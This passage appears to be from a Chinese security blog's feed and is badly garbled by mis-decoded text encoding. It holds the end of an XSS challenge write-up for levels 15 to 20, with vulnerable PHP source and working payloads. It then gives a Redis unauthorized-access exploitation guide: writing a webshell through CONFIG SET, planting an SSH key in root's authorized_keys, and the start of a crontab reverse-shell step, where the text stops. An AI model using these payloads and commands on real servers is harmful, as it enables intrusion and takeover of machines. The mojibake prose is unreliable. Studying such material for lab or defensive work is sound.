ï¼Œè¯´æ˜¯è¦æ³¨æ„ä¸‹é¢è¿™é‡Œ</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558267117962.png" alt="1558267117962"></p><p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ç›¸å…³çŸ¥è¯†</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558265795045.png" alt="1558265795045"></p><p>å‘ç°ng-includeå¯ä»¥åˆ©ç”¨ï¼Œå› ä¸ºä¸èƒ½è·¨åŸŸï¼Œæ‰€ä»¥åŒ…å«ä¸€ä¸ªå‰é¢çš„å…³å¡ï¼Œ<code>&lt;script&gt;</code>æ²¡æœ‰æˆåŠŸï¼Œä½¿ç”¨<code>&lt;img&gt;</code>æˆåŠŸè§¦å‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;/h2&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;h2&gt;&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558266253831.png" alt="1558266253831"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>æ­¤å¤„åªæœ‰ä¸€ä¸ªè¾“å‡ºç‚¹ï¼Œè¢«å®ä½“åŒ–è½¬ä¹‰è¿‡äº†ï¼Œä¹Ÿä¸æ˜¯å•å¼•å·é—­åˆï¼Œæ‰€ä»¥æ— æ³•é€ƒé€¸ï¼Œåªèƒ½ä»<code>ng-include</code>å¤„å…¥æ‰‹äº†ã€‚</p><p>è¿˜æœ‰ä¸€ç‚¹ç–‘é—®ï¼Œæˆ‘ä»¬çš„payloadæ˜æ˜è¢«å®ä½“åŒ–è½¬ä¹‰æ‰äº†ï¼Œä¸ºä»€ä¹ˆè¿˜å¯ä»¥å†åŸæ ·è¾“å‡ºå›æ¥å‘¢ï¼Ÿ</p><p>æ€»ç»“ï¼š</p><p>å‘ç°ä¸ä¸€æ ·ï¼Œä¸äº†è§£çš„ç‚¹æ—¶ï¼Œå¤šå»æŸ¥æŸ¥ç›¸å…³èµ„æ–™ï¼Œä¸èƒ½é”™è¿‡çŸ¥è¯†ç‚¹å¤–çš„æœºä¼šã€‚</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="ç©ºæ ¼å­—ç¬¦ç»•è¿‡"><a href="#ç©ºæ ¼å­—ç¬¦ç»•è¿‡" class="headerlink" title="ç©ºæ ¼å­—ç¬¦ç»•è¿‡"></a>ç©ºæ ¼å­—ç¬¦ç»•è¿‡</h3><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558267796468.png" alt="1558267796468"></p><p>å°è¯•<code>&lt;script&gt;</code>æ ‡ç­¾</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558268014317.png" alt="1558268014317"></p><p><code>script</code> å’Œ <code>/</code> æ›¿æ¢ä¸ºç©ºï¼Œè¯•ä¸€ä¸‹<code>svg</code></p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558268343632.png" alt="1558268343632">å‘ç°åªæœ‰ç©ºæ ¼è¢«è¿‡æ»¤æ‰ï¼Œä½¿ç”¨<code>%0a</code> <code>%0d</code>åšåˆ†éš”ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br><span class="line">?keyword=&lt;svg%0donload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558268510194.png" alt="1558268510194"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>åªæ˜¯å¯¹ç©ºæ ¼ï¼Œ<code>script</code>ï¼Œ<code>/</code> è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸ä½¿ç”¨<code>script</code>ï¼Œå¹¶ä¸”ç”¨å…¶ä»–æ–¹å¼ä»£æ›¿ç©ºæ ¼å³å¯æˆåŠŸç»•è¿‡ã€‚</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="å±æ€§ç©ºæ ¼é€ƒé€¸"><a href="#å±æ€§ç©ºæ ¼é€ƒé€¸" class="headerlink" title="å±æ€§ç©ºæ ¼é€ƒé€¸"></a>å±æ€§ç©ºæ ¼é€ƒé€¸</h3><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558273349908.png" alt="1558273349908"></p><p>å¯ä»¥çœ‹åˆ°å¯æ§çš„å‚æ•°æœ‰ä¸¤ä¸ªï¼Œè¯•ä¸€ä¸‹æ ‡ç­¾é€ƒé€¸</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558273500807.png" alt="1558273500807"></p><p><code>&lt;&gt;</code>ï¼Œ<code>&quot;</code>è¢«è¿‡æ»¤ï¼Œæœ€åè¯•å‡ºæ¥ä¸ªå“ˆå“ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558273987115.png" alt="1558273987115"></p><p>é‚£è¿™æ ·åº”è¯¥ä¹Ÿèƒ½è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558274123391.png" alt="1558274123391"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>è™½ç„¶å‚æ•°éƒ½åŠ ä¸Šäº†å®ä½“åŒ–è½¬ä¹‰ï¼Œä½†æ˜¯æ²¡æœ‰å¼•å·é—­åˆå±æ€§ï¼Œæ‰€ä»¥æ·»åŠ ç©ºæ ¼å°±å¯ä»¥å†™ä¸ªæ–°å±æ€§å•¦å“ˆå“ˆ</p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><h3 id="å±æ€§ç©ºæ ¼é€ƒé€¸-1"><a href="#å±æ€§ç©ºæ ¼é€ƒé€¸-1" class="headerlink" title="å±æ€§ç©ºæ ¼é€ƒé€¸"></a>å±æ€§ç©ºæ ¼é€ƒé€¸</h3><p>Excuse me ???ï¼Œä¸ŠæŠŠçš„payloadéƒ½æ²¡å˜</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558274541848.png" alt="1558274541848"></p><p>çœ‹ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ç…äº†åŠå¤©ï¼Œæ‰å‘ç°åªæ˜¯å¼•ç”¨çš„swfæ–‡ä»¶åä¸ä¸€æ ·ã€‚ã€‚å¥½å§ï¼Œä¸‹ä¸€å…³</p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>è¿™å…³è¯•äº†æ€ä¹ˆè¯•éƒ½è·³ä¸å‡ºäº†å±æ€§çš„å€¼</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558313314215.png" alt="1558313314215"></p><p>çœ‹ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼šè¿™é‡Œå’Œä¸Šä¸¤å…³</p><p>çš„åŒºåˆ«å°±åœ¨äºæœ‰äº†åŒå¼•å·æ¥é—­åˆå±æ€§çš„å€¼ï¼Œåˆå› ä¸ºä½¿ç”¨äº†å®ä½“åŒ–è½¬ä¹‰çš„å‡½æ•°ï¼ŒåŒå¼•å·æ— æ³•é€ƒè„±å‡ºå»ã€‚æ‰€ä»¥è¿™å…³è€ƒå¯Ÿçš„åº”è¯¥æ˜¯Flash XSSï¼Œå‚è€ƒäº†<a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">D4rk3r</a>è¿™ä½å¤§ä½¬çš„æ–‡ç« </p><p>ä½¿ç”¨å·¥å…·<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a></p><p>é¦–å…ˆæ‰¾åˆ°getURLå‡½æ•°</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558315194981.png" alt="1558315194981"></p><p>ç„¶åå‘ç°äº†versionå‚æ•°ä¼šè¢«ä¼ å…¥loc4å˜é‡ä¸­ï¼Œå³sIFRçš„å†…å®¹ä¸­</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558315623256.png" alt="1558315623256"></p><p>ä½†æ˜¯æ ¹æ®ç¬¬ä¸€å¼ å›¾ä¸­getURLåªåœ¨å†…å®¹ä¸ºlinkæ—¶æ‰“å¼€ï¼Œæ‰€ä»¥å†çœ‹ä¸‹contentIsLink()å‡½æ•°</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558316052078.png" alt="1558316052078"></p><p>å¾—çŸ¥æ„é€ <code>&lt;a&gt;&lt;/a&gt;</code>æ ‡ç­¾æ¥ä¼ å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558316206643.png" alt="1558316206643"></p><p>æ³¨æ„ï¼šæˆ‘çš„ç«ç‹æµè§ˆå™¨åŠ è½½ä¸å‡ºæ¥flashï¼Œè¿™é‡Œç”¨çš„chromeå¯ä»¥åŠ è½½</p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><h3 id="Flash-XSS-1"><a href="#Flash-XSS-1" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>è¿™ä¸€å…³å’Œä¸Šå…³ä¸€æ ·ï¼Œè€ƒå¯ŸFlash XSS</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šè¯´æ˜¯<strong>zeroclipboard.swf</strong> çš„XSSï¼Œå…¶ä¸»è¦çš„åŠŸèƒ½æ˜¯å¤åˆ¶å†…å®¹åˆ°å‰ªåˆ‡æ¿ï¼Œä¸­é—´ç”±flashè¿›è¡Œä¸­è½¬ä¿è¯å…¼å®¹ä¸»æµæµè§ˆå™¨ï¼Œå…·ä½“åšæ³•å°±æ˜¯ä½¿è¿™ä¸ªé€æ˜çš„flashæ¼‚æµ®åœ¨å¤åˆ¶æŒ‰é’®ä¹‹ä¸Šï¼Œä¸‹é¢ç»™å‡ºxss pocä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id</span><br><span class="line">&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558343919410.png" alt="1558343919410"></p><p>çœ‹ä¸€ä¸‹flashä»£ç ï¼Œçœ‹ä¸æ‡‚äº† (ï¿£_ï¿£|||)ï¼Œå°±å…ˆè®°å½•ä¸€ä¸‹payloadå§ã€‚</p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p><p><a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">XSSæŒ‘æˆ˜ä¹‹æ—…â€“æ¸¸æˆé—¯å…³</a></p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">ã€å·¨äººè‚©è†€ä¸Šçš„çŸ®å­ã€‘XSSæŒ‘æˆ˜ä¹‹æ—…â€”æ¸¸æˆé€šå…³æ”»ç•¥ï¼ˆæ›´æ–°è‡³18å…³ï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ–‡ç«  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisæœªæˆæƒè®¿é—®æ¼æ´</title>
      <link href="/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€Redisä»‹ç»"><a href="#ä¸€ã€Redisä»‹ç»" class="headerlink" title="ä¸€ã€Redisä»‹ç»"></a>ä¸€ã€Redisä»‹ç»</h2><p><code>Redis</code>æ˜¯ä¸€ä¸ªå¼€æºçš„ï¼ŒåŸºäº<code>ANSI Cè¯­è¨€</code>å¼€å‘ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹çš„é«˜æ€§èƒ½çš„Key-Valueæ•°æ®åº“ç³»ç»Ÿ</p><h2 id="äºŒã€æ¼æ´åŸç†"><a href="#äºŒã€æ¼æ´åŸç†" class="headerlink" title="äºŒã€æ¼æ´åŸç†"></a>äºŒã€æ¼æ´åŸç†</h2><p> Redisæœªæˆæƒè®¿é—®æ¼æ´å³RedisåŒ¿åè®¿é—®æ¼æ´ï¼Œæ˜¯ç”±äº <code>Redis</code>æœåŠ¡æœ¬èº«çš„ç‰¹æ€§åŠå…¶è¿ç»´ä¸å½“é€ æˆçš„ã€‚</p><p><code>Redis</code>çš„é»˜è®¤é…ç½®æ–‡ä»¶ä¸­ï¼Œä¼šç»‘å®š <code>0.0.0.0:6379</code>ï¼Œè¿™æ · <code>Redis</code>ä¼šç›‘å¬ä¸€åˆ‡ <code>IP</code>ï¼Œæ¥æ”¶ä¸€åˆ‡ <code>IP</code>çš„è¯·æ±‚ã€‚å¦‚æœæ²¡æœ‰é‡‡ç”¨æ·»åŠ é˜²ç«å¢™è§„åˆ™ç­‰å®‰å…¨ç­–ç•¥å±è”½éä¿¡ä»»æ¥æº <code>IP</code>è®¿é—®ï¼Œå°±ä¼šä½¿ <code>Redis</code>æœåŠ¡æš´éœ²åœ¨å…¬ç½‘ï¼Œè¢«ä»»æ„ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚</p><p><code>Redis</code>é»˜è®¤æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼Œæ²¡æœ‰è¿›è¡Œç›¸åº”çš„å¯†ç éªŒè¯ä¼šå¯¼è‡´ä»»æ„ ç”¨æˆ·å…å¯†ç™»å½• <code>Redis</code>ï¼Œä»è€Œè¯»å– <code>Redis</code>çš„æ•°æ®ã€ç¯¡æ”¹ <code>Redis</code>çš„æ•°æ®æˆ–è€…æ›´é«˜å±çš„æ“ä½œã€‚</p><a id="more"></a><h2 id="äºŒã€Rediså®‰è£…"><a href="#äºŒã€Rediså®‰è£…" class="headerlink" title="äºŒã€Rediså®‰è£…"></a>äºŒã€Rediså®‰è£…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get update</span><br><span class="line">$sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><h2 id="äºŒã€RedisæœåŠ¡å™¨é…ç½®"><a href="#äºŒã€RedisæœåŠ¡å™¨é…ç½®" class="headerlink" title="äºŒã€RedisæœåŠ¡å™¨é…ç½®"></a>äºŒã€RedisæœåŠ¡å™¨é…ç½®</h2><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ /opt/redis/redis.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bind 127.0.0.1#ç›‘å¬ä»»æ„ip</span><br><span class="line">protected-mode no#å…³é—­ä¿æŠ¤æ¨¡å¼</span><br></pre></td></tr></table></figure><p>å¯åŠ¨redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf #é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€Rediså®¢æˆ·ç«¯è¿æ¥"><a href="#ä¸‰ã€Rediså®¢æˆ·ç«¯è¿æ¥" class="headerlink" title="ä¸‰ã€Rediså®¢æˆ·ç«¯è¿æ¥"></a>ä¸‰ã€Rediså®¢æˆ·ç«¯è¿æ¥</h2><p>å®¢æˆ·ç«¯ï¼ˆæœ¬åœ°å®¿ä¸»æœºï¼‰è¿æ¥redisæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><h2 id="å››ã€åŸºç¡€å‘½ä»¤"><a href="#å››ã€åŸºç¡€å‘½ä»¤" class="headerlink" title="å››ã€åŸºç¡€å‘½ä»¤"></a>å››ã€åŸºç¡€å‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info#ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæœåŠ¡å™¨ä¿¡æ¯ç­‰</span><br><span class="line">set name &quot;hi&quot;#è®¾ç½®å˜é‡</span><br><span class="line">get name #å–å€¼</span><br><span class="line">flushall #åˆ é™¤æ•°æ®åº“ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ä¸è¦ç”¨ï¼ï¼‰</span><br><span class="line">keys * #æŸ¥çœ‹æ‰€æœ‰çš„é”®</span><br><span class="line">CONFIG GET dir/dbfilename#è·å–é»˜è®¤çš„Reidsç›®å½•å’Œrdbçš„æ–‡ä»¶åï¼Œåœ¨ä¿®æ”¹å‰å…ˆè·å–ï¼Œç„¶åèµ°çš„æ—¶å€™å†æ¢å¤</span><br><span class="line">CONFIG SET dir/dbfilename#ä¿®æ”¹é»˜è®¤çš„Reidsç›®å½•å’Œrdbçš„æ–‡ä»¶å</span><br><span class="line">save#æ‰§è¡ŒåŒæ­¥ä¿å­˜æ“ä½œï¼Œå°†å½“å‰Rediså®ä¾‹çš„æ‰€æœ‰æ•°æ®å¿«ç…§(snapshot)ä»¥RDBæ–‡ä»¶çš„å½¢å¼ä¿å­˜åˆ°ç¡¬ç›˜ã€‚</span><br><span class="line">bgsave#forkä¸€ä¸ªå­è¿›ç¨‹æ¥åˆ›å»ºRDBæ–‡ä»¶ï¼Œçˆ¶è¿›ç¨‹å¯ä»¥ç»§ç»­å¤„ç†å‘½ä»¤è¯·æ±‚ã€‚</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š</p><p>saveï¼šä¼šé˜»å¡redisæœåŠ¡å™¨è¿›ç¨‹ï¼Œç›´åˆ°åˆ›å»ºRDBæ–‡ä»¶å®Œæ¯•ä¸ºæ­¢ï¼›ï¼ˆåœ¨æ­¤æœŸé—´è¿›ç¨‹ä¸èƒ½å¤„ç†ä»»ä½•è¯·æ±‚ï¼‰<br>bgsaveï¼šå‘½ä»¤æ‰§è¡Œä¹‹åç«‹å³è¿”å› OK ï¼Œç„¶åRedis fork å‡ºä¸€ä¸ªæ–°å­è¿›ç¨‹ï¼ŒåŸæ¥çš„Redis è¿›ç¨‹(çˆ¶è¿›ç¨‹)ç»§ç»­å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè€Œå­è¿›ç¨‹åˆ™è´Ÿè´£å°†æ•°æ®ä¿å­˜åˆ°ç£ç›˜ï¼Œç„¶åé€€å‡º</p></blockquote><h2 id="äº”ã€æ”»å‡»åˆ©ç”¨æ–¹å¼"><a href="#äº”ã€æ”»å‡»åˆ©ç”¨æ–¹å¼" class="headerlink" title="äº”ã€æ”»å‡»åˆ©ç”¨æ–¹å¼"></a>äº”ã€æ”»å‡»åˆ©ç”¨æ–¹å¼</h2><h3 id="1-å†™Webshell"><a href="#1-å†™Webshell" class="headerlink" title="1. å†™Webshell"></a>1. å†™Webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir /var/www/#å°†rdbæ–‡ä»¶ä¿å­˜åœ¨/var/www/ä¸­</span><br><span class="line">CONFIG SET dbfilename redis.php#å°†rdbæ–‡ä»¶åä¿®æ”¹ä¸ºredis.php</span><br><span class="line">set shell &quot;&lt;?php phpinfo();?&gt;&quot;#å¾€redis.phpä¸­å†™æœ¨é©¬</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><h3 id="2-sshé…ç½®å…å¯†ç™»å½•"><a href="#2-sshé…ç½®å…å¯†ç™»å½•" class="headerlink" title="2. sshé…ç½®å…å¯†ç™»å½•"></a>2. sshé…ç½®å…å¯†ç™»å½•</h3><p>æ¡ä»¶ï¼š</p><ul><li>RedisæœåŠ¡ä½¿ç”¨ROOTè´¦å·å¯åŠ¨ </li><li>æœåŠ¡å™¨å¼€æ”¾SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨</li></ul><p>å…ˆåœ¨æ¸—é€ä¸»æœºä¸Šç”Ÿæˆ <code>ssh</code>çš„ç§é’¥ä¸å…¬é’¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa//ä¸€ç›´å›è½¦å³å¯</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; hack.txt# ä¿å­˜å…¬é’¥åˆ°hack.txtä¸­</span><br><span class="line">cat hack.txt | redis-cli -h 192.168.1.10 -p 6379 -x set hack # æŠŠå…¬é’¥å†™å…¥åˆ°redisä¸»æœº</span><br></pre></td></tr></table></figure><p>ç™»é™†è®¿é—®redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹RDBå­˜å‚¨ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>sshè¿œç¨‹è¿æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.13</span><br></pre></td></tr></table></figure><h3 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3. åå¼¹shell"></a>3. åå¼¹shell</h3><p>crontabå‘¨æœŸæ€§æ‰§è¡Œä»»åŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 